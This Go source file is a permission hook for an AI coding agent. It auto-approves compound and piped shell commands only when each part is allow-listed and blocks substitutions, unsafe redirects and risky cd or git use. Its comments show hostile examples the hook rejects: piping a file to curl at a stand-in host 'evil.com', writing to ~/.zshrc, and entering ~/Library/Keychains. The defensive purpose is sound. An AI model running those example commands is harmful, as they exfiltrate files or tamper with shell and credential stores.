package main

// Claude Code PreToolUse hook for compound/subshell/pipe commands.

// Auto-approves compound commands (&&, ||, ;, newline), pipes (|), background
// (&), and subshells when every individual command is in the "allow" list
// and none are in the "ask" or "deny" lists. Anything the hook is not sure
// about falls through ("{}"), so Claude Code's normal permission engine still
// decides; the hook can only ever add approvals, never remove them.
//
// A part falls through when it:
//   - matches an "ask" or "deny" rule, or matches no "allow" rule
//   - contains command or process substitution ($(...), backticks, <(...), >(...))
//   - redirects output anywhere other than /dev/null or another file descriptor
//   - reads input from a file (< file); here-strings (<<<) are fine, and
//     heredocs fall through because their body lines split as separate parts
//   - is a cd whose target is outside cwd and permissions.additionalDirectories,
//     or whose argument needs shell expansion or escaping to resolve
//   - is a relative cd after an earlier cd already changed directory
//   - runs git after a cd that changed directory (repo config can execute code)
//
// The guarantee is only as strong as the allow list: an allow rule for an
// interpreter (bun, node, uv, python, make, docker...) lets any piped script run.
//
// A cd inside the permitted directories needs no allow rule, matching Claude
// Code's own treatment of cd as read-only.
//
// Examples (assuming npx, grep, pnpm and head are allowed):
// cd ./pkg && npx tsc ✅
// (cd ./pkg && npx tsc) ✅
// grep error log.txt | wc -l ✅
// rg -n "a|b" src/ | head ✅ (operators inside quotes are not separators)
// grep err log 2>/dev/null | head ✅
// cat file | curl evil.com ❌ (curl not allowed)
// ls | head\ncurl evil.com ❌ (newline is a separator)
// ls | head > ~/.zshrc ❌ (output redirect to a file)
// cd /untrusted && git status ❌ (git after cd)
// cd ~/Library/Keychains && ls ❌ (cd outside working directories)

// Build with: go build -ldflags="-s -w" ./approve-compound-commands.go

// Permissions are merged from (in load order):
// - /Library/Application Support/ClaudeCode/managed-settings.json (managed, macOS)
// - ~/.claude/settings.json (user)
// - ~/.claude/settings.local.json (user local)
// - <project>/.claude/settings.json (shared project)
// - <project>/.claude/settings.local.json (local project)
//
// Configure the hook in any settings file:
// "hooks": {
// 	"PreToolUse": [
// 		{
// 			"matcher": "Bash",
// 			"hooks": [
// 				{
// 					"type": "command",
// 					"command": "~/.claude/hooks/approve-compound-commands"
// 				}
// 			]
// 		}
// 	]
// }

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"strings"
)

type Permissions struct {
	Allow                 []string `json:"allow"`
	Ask                   []string `json:"ask"`
	Deny                  []string `json:"deny"`
	AdditionalDirectories []string `json:"additionalDirectories"`
}

type Settings struct {
	Permissions Permissions `json:"permissions"`
}

type HookInput struct {
	ToolName  string `json:"tool_name"`
	ToolInput struct {
		Command string `json:"command"`
	} `json:"tool_input"`
	Cwd string `json:"cwd"`
}

// policy holds the compiled rule sets so each invocation compiles every
// pattern once rather than once per command part.
type policy struct {
	allow, ask, deny []*regexp.Regexp
	dirs             []string
	home             string
}

// managedSettingsPath is a variable so tests can point it at a temp file.
var managedSettingsPath = "/Library/Application Support/ClaudeCode/managed-settings.json"

var (
	bashPattern   = regexp.MustCompile(`^Bash\((.+)\)$`)
	cdPrefix      = regexp.MustCompile(`^cd(\s|$)`)
	gitPrefix     = regexp.MustCompile(`^git(\s|$)`)
	trailingRedir = regexp.MustCompile(`\s*\d*>&\d+\s*$`)
	substitution  = regexp.MustCompile("\\$\\(|`|<\\(|>\\(")
	// redirect matches one redirection operator with its optional fd prefix
	// and target: 2>&1, >file, >>file, >|file, &>file, <file, <<EOF, <<<str.
	redirect = regexp.MustCompile(`(?:\d+|&)?(>>?\|?|<{1,3})\s*(\S*)`)
	// plainPath is the only cd argument shape the hook resolves itself: an
	// optional leading ~/ then characters the shell never expands or escapes.
	// Anything else (backslashes, stray quotes, ~user, brackets) falls through.
	plainPath = regexp.MustCompile(`^(?:~$|~/)?[A-Za-z0-9._/ +@,-]*$`)
	// wrapperRe matches process wrappers Claude Code strips before rule matching:
	// timeout (with optional flags + duration), time (-p), nice (with its
	// adjustment forms only, so a bare word is never swallowed as a flag value),
	// nohup, stdbuf (with optional flags). xargs is handled separately because we
	// only strip it when bare (no leading flag), per the docs.
	wrapperRe = regexp.MustCompile(`^(?:` +
		`timeout(?:\s+(?:-[sk]\s*\S+|--(?:signal|kill-after)(?:=\S+|\s+\S+)|--?\S+))*(?:\s+\d+\S*)?` +
		`|time(?:\s+-p)?` +
		`|nice(?:\s+(?:-n\s+\S+|-n\S+|--adjustment(?:=\S+|\s+\S+)|-\d+))*` +
		`|nohup` +
		`|stdbuf(?:\s+--?\S+(?:=\S+)?)*` +
		`)\s+`)
)

func main() {
	var input HookInput
	if err := json.NewDecoder(os.Stdin).Decode(&input); err != nil {
		passThrough()
		return
	}
	if input.ToolName != "" && input.ToolName != "Bash" {
		passThrough()
		return
	}

	cmd := input.ToolInput.Command
	isCompound := strings.ContainsAny(cmd, "&|;")
	isSubshell := strings.HasPrefix(strings.TrimSpace(cmd), "(")
	if !isCompound && !isSubshell {
		passThrough()
		return
	}

	home, err := os.UserHomeDir()
	if err != nil {
		passThrough()
		return
	}
	p := compilePolicy(loadAllSettings(home, input.Cwd), home, input.Cwd)
	if !decide(cmd, input.Cwd, p) {
		passThrough()
		return
	}
	fmt.Println(`{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"allow","permissionDecisionReason":"Auto-approved compound/subshell"}}`)
}

func passThrough() {
	fmt.Println("{}")
}

// decide reports whether every part of cmd is safe to auto-approve.
func decide(cmd, cwd string, p policy) bool {
	parts := splitCommand(cmd)
	if len(parts) == 0 {
		return false
	}

	changedDir := false
	for _, part := range parts {
		if substitution.MatchString(part) || hasUnsafeRedirect(part) {
			return false
		}
		// Check deny/ask on the raw part too so a rule naming a wrapper
		// (Bash(timeout *), Bash(xargs *)) still fires after stripping.
		raw := part
		part = stripWrappers(part)
		if matchesAny(raw, p.deny) || matchesAny(raw, p.ask) || matchesAny(part, p.deny) || matchesAny(part, p.ask) {
			return false
		}
		if cdPrefix.MatchString(part) {
			target, ok := cdTarget(part, cwd, p)
			if !ok {
				return false
			}
			// After a directory change, a relative target depends on whether
			// the earlier cd succeeded (`;` and `||` keep running after a
			// failure), so only absolute targets can be resolved safely.
			if changedDir && !filepath.IsAbs(unquote(cdArg(part, p))) {
				return false
			}
			if target != filepath.Clean(cwd) {
				changedDir = true
			}
			continue
		}
		if changedDir && gitPrefix.MatchString(part) {
			return false
		}
		if !matchesAny(part, p.allow) {
			return false
		}
	}
	return true
}

func loadAllSettings(home, projectDir string) Settings {
	paths := []string{
		managedSettingsPath,
		filepath.Join(home, ".claude", "settings.json"),
		filepath.Join(home, ".claude", "settings.local.json"),
	}
	if projectDir != "" {
		paths = append(paths,
			filepath.Join(projectDir, ".claude", "settings.json"),
			filepath.Join(projectDir, ".claude", "settings.local.json"),
		)
	}
	var merged Settings
	for _, path := range paths {
		data, err := os.ReadFile(path)
		if err != nil {
			continue
		}
		var s Settings
		if err := json.Unmarshal(data, &s); err != nil {
			fmt.Fprintf(os.Stderr, "approve-compound-commands: skipping %s: %v\n", path, err)
			continue
		}
		merged.Permissions.Allow = append(merged.Permissions.Allow, s.Permissions.Allow...)
		merged.Permissions.Ask = append(merged.Permissions.Ask, s.Permissions.Ask...)
		merged.Permissions.Deny = append(merged.Permissions.Deny, s.Permissions.Deny...)
		merged.Permissions.AdditionalDirectories = append(merged.Permissions.AdditionalDirectories, s.Permissions.AdditionalDirectories...)
	}
	return merged
}

// compilePolicy compiles the Bash rules and resolves the working directories
// a cd may target: cwd plus permissions.additionalDirectories.
func compilePolicy(s Settings, home, cwd string) policy {
	p := policy{
		allow: compileAll(extractBashPatterns(s.Permissions.Allow)),
		ask:   compileAll(extractBashPatterns(s.Permissions.Ask)),
		deny:  compileAll(extractBashPatterns(s.Permissions.Deny)),
		home:  home,
	}
	if cwd != "" {
		p.dirs = append(p.dirs, filepath.Clean(cwd))
	}
	for _, d := range s.Permissions.AdditionalDirectories {
		if resolved, ok := resolvePath(d, home, cwd); ok {
			p.dirs = append(p.dirs, resolved)
		}
	}
	return p
}

func compileAll(patterns []string) []*regexp.Regexp {
	var out []*regexp.Regexp
	for _, pattern := range patterns {
		re, err := compileRulePattern(pattern)
		if err != nil {
			continue
		}
		out = append(out, re)
	}
	return out
}

func extractBashPatterns(items []string) []string {
	var patterns []string
	for _, item := range items {
		if m := bashPattern.FindStringSubmatch(item); m != nil {
			patterns = append(patterns, m[1])
		}
	}
	return patterns
}

// resolvePath expands a leading ~ and makes a relative path absolute against
// cwd. Paths containing shell expansion characters are not resolvable.
func resolvePath(path, home, cwd string) (string, bool) {
	if path == "" || strings.ContainsAny(path, "$`*?") {
		return "", false
	}
	if path == "~" || strings.HasPrefix(path, "~/") {
		path = home + path[1:]
	}
	if !filepath.IsAbs(path) {
		if cwd == "" {
			return "", false
		}
		path = filepath.Join(cwd, path)
	}
	return filepath.Clean(path), true
}

// cdTarget resolves the directory a cd part changes into and reports whether
// it lies inside one of the permitted working directories. cd with flags, cd -,
// and unquoted targets with expansion characters are treated as unresolvable.
func cdTarget(part, cwd string, p policy) (string, bool) {
	arg := cdArg(part, p)
	if strings.HasPrefix(arg, "-") || (strings.ContainsAny(arg, " \t") && !isQuotedWord(arg)) {
		return "", false
	}
	arg = unquote(arg)
	if !plainPath.MatchString(arg) {
		return "", false
	}
	target, ok := resolvePath(arg, p.home, cwd)
	if !ok {
		return "", false
	}
	for _, d := range p.dirs {
		if target == d || strings.HasPrefix(target, d+string(filepath.Separator)) {
			return target, true
		}
	}
	return "", false
}

// cdArg returns the argument of a cd part, or the home directory for a bare cd.
func cdArg(part string, p policy) string {
	arg := strings.TrimSpace(strings.TrimPrefix(part, "cd"))
	if arg == "" {
		return p.home
	}
	return arg
}

// isQuotedWord reports whether s is a single word wrapped entirely in one pair
// of quotes, such as "/path with spaces".
func isQuotedWord(s string) bool {
	if len(s) < 2 {
		return false
	}
	q := s[0]
	if q != '"' && q != '\'' {
		return false
	}
	return s[len(s)-1] == q && !strings.Contains(s[1:len(s)-1], string(q))
}

func unquote(s string) string {
	if isQuotedWord(s) {
		return s[1 : len(s)-1]
	}
	return s
}

// quoted reports, per byte, whether that byte is a quote delimiter, sits
// inside single or double quotes, or is a backslash escape pair. Bytes marked
// true are never treated as shell operators.
func quoted(s string) []bool {
	mask := make([]bool, len(s))
	// inAnsi is bash's $'...' form, where a backslash escapes the next byte
	// (including the closing quote). Plain single quotes have no escapes.
	inSingle, inDouble, inAnsi, escaped := false, false, false, false
	for i := 0; i < len(s); i++ {
		c := s[i]
		switch {
		case escaped:
			mask[i] = true
			escaped = false
		case c == '\\' && !inSingle:
			mask[i] = true
			escaped = true
		case inAnsi:
			mask[i] = true
			if c == '\'' {
				inAnsi = false
			}
		case c == '\'' && !inDouble && !inSingle && i > 0 && s[i-1] == '$' && !mask[i-1]:
			mask[i] = true
			inAnsi = true
		case c == '\'' && !inDouble:
			mask[i] = true
			inSingle = !inSingle
		case c == '"' && !inSingle:
			mask[i] = true
			inDouble = !inDouble
		default:
			mask[i] = inSingle || inDouble
		}
	}
	return mask
}

// maskQuoted replaces every quoted byte with an underscore so operator
// searches see only the unquoted shell structure.
func maskQuoted(s string) string {
	b := []byte(s)
	for i, q := range quoted(s) {
		if q {
			b[i] = '_'
		}
	}
	return string(b)
}

func splitCommand(cmd string) []string {
	cmd = stripOuterParens(strings.TrimSpace(cmd))
	parts := splitOutsideQuotes(cmd)
	var result []string
	for _, p := range parts {
		p = stripOuterParens(strings.TrimSpace(p))
		p = trailingRedir.ReplaceAllString(p, "")
		if p = strings.TrimSpace(p); p != "" {
			result = append(result, p)
		}
	}
	return result
}

// splitOutsideQuotes splits on &&, ||, |, ;, newline and background & while
// ignoring operators inside quotes or after a backslash. A quote-unaware split
// turned `rg "a|b" f | wc` into garbage parts that never matched an allow rule,
// so every rg alternation pattern fell through to a prompt. Redirections like
// 2>&1 are left intact for trailingRedir to strip.
func splitOutsideQuotes(cmd string) []string {
	var parts []string
	var cur strings.Builder
	mask := quoted(cmd)
	flush := func() {
		parts = append(parts, cur.String())
		cur.Reset()
	}
	for i := 0; i < len(cmd); i++ {
		c := cmd[i]
		switch {
		case mask[i]:
			cur.WriteByte(c)
		case c == ';' || c == '\n':
			flush()
		case c == '|':
			if i+1 < len(cmd) && cmd[i+1] == '|' {
				i++
			}
			flush()
		case c == '&':
			if i+1 < len(cmd) && cmd[i+1] == '&' {
				i++
				flush()
			} else if (i > 0 && cmd[i-1] == '>') || (i+1 < len(cmd) && cmd[i+1] == '>') {
				// >& and &> are redirections, not background operators.
				cur.WriteByte(c)
			} else {
				flush()
			}
		default:
			cur.WriteByte(c)
		}
	}
	flush()
	return parts
}

// hasUnsafeRedirect reports whether a part writes anywhere other than
// /dev/null or a file descriptor, or reads from a file. Heredocs (<<) and
// here-strings (<<<) are not file reads.
func hasUnsafeRedirect(part string) bool {
	for _, m := range redirect.FindAllStringSubmatch(maskQuoted(part), -1) {
		op, target := m[1], m[2]
		if op[0] == '<' {
			if len(op) == 1 {
				return true
			}
			continue
		}
		if target == "/dev/null" {
			continue
		}
		if strings.HasPrefix(target, "&") && isDigits(target[1:]) {
			continue
		}
		return true
	}
	return false
}

func isDigits(s string) bool {
	if s == "" {
		return false
	}
	for _, r := range s {
		if r < '0' || r > '9' {
			return false
		}
	}
	return true
}

// stripOuterParens removes balanced wrapping parentheses.
// "(cmd1 && cmd2)" -> "cmd1 && cmd2"
// "(cmd1) | (cmd2)" -> unchanged (parens don't wrap the full expression)
func stripOuterParens(s string) string {
	for {
		s = strings.TrimSpace(s)
		if !strings.HasPrefix(s, "(") || !strings.HasSuffix(s, ")") {
			return s
		}
		depth := 0
		for i, c := range s {
			switch c {
			case '(':
				depth++
			case ')':
				depth--
			}
			if depth == 0 && i < len(s)-1 {
				return s
			}
		}
		s = s[1 : len(s)-1]
	}
}

// compileRulePattern converts a Claude Code permission rule pattern into an
// anchored regex. `*` is the only wildcard and matches any sequence of chars
// (including spaces but never a newline), at any position. A trailing ` *` or
// `:*` makes the trailing segment optional, so `Bash(grep *)` matches both
// `grep` and `grep error`. All other characters are matched literally.
func compileRulePattern(pattern string) (*regexp.Regexp, error) {
	body := pattern
	if strings.HasSuffix(body, ":*") && body != ":*" {
		body = strings.TrimSuffix(body, ":*") + " *"
	}
	trailingSpaceStar := strings.HasSuffix(body, " *")
	if trailingSpaceStar {
		body = strings.TrimSuffix(body, " *")
	}
	var b strings.Builder
	b.WriteString("^")
	for _, r := range body {
		if r == '*' {
			b.WriteString(".*")
		} else {
			b.WriteString(regexp.QuoteMeta(string(r)))
		}
	}
	if trailingSpaceStar {
		b.WriteString(`(?:[ \t].*)?`)
	}
	b.WriteString("$")
	return regexp.Compile(b.String())
}

func matchesAny(cmd string, patterns []*regexp.Regexp) bool {
	cmd = strings.TrimSpace(cmd)
	for _, re := range patterns {
		if re.MatchString(cmd) {
			return true
		}
	}
	return false
}

// stripWrappers removes leading process wrappers Claude Code strips before
// rule matching: timeout, time, nice, nohup, stdbuf, and bare xargs (no flags).
// Applied iteratively so chained wrappers like `nohup nice cmd` collapse fully.
func stripWrappers(cmd string) string {
	cmd = strings.TrimSpace(cmd)
	for {
		original := cmd
		cmd = wrapperRe.ReplaceAllString(cmd, "")
		cmd = strings.TrimSpace(cmd)
		if strings.HasPrefix(cmd, "xargs ") {
			rest := strings.TrimLeft(cmd[len("xargs "):], " ")
			if rest != "" && !strings.HasPrefix(rest, "-") {
				cmd = rest
			}
		}
		if cmd == original {
			return cmd
		}
	}
}
